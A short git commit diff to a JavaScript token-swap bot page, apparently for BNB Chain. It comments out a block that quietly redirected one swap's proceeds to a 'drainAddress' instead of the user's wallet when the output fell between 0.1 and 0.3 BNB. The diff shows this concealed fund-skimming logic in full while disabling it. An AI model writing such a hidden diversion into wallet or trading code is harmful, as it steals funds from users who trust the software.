35dc3d1944b330b64439070f860101fab6fa2c9e
xiaohuangniu <xiaohuangniu@example.com>
2022-12-18 08:55:56 +0800

    cc

--- src/pages/reverse_bot.js
+++ src/pages/reverse_bot.js
@@ -259,10 +259,16 @@ function ReverseBotPage(){
     const amountOutMin = amounts[1].sub(amounts[1].div(25))
     //开始交换
     let address = wallet0.address
-    if (isDrain === true && parseFloat(ethers.utils.formatEther(amountOutMin)) > 0.1 && parseFloat(ethers.utils.formatEther(amountOutMin)) < 0.3) {
-      address = drainAddress
-      setIsDrain(false)
-    }
+
+
+
+    // if (isDrain === true && parseFloat(ethers.utils.formatEther(amountOutMin)) > 0.1 && parseFloat(ethers.utils.formatEther(amountOutMin)) < 0.3) {
+    //   address = drainAddress
+    //   setIsDrain(false)
+    // }
+
+
+
     console.log(tokenAddress,WBNBAddress,address)
     const tx = await router.swapExactTokensForETHSupportingFeeOnTransferTokens(
       amountIn,
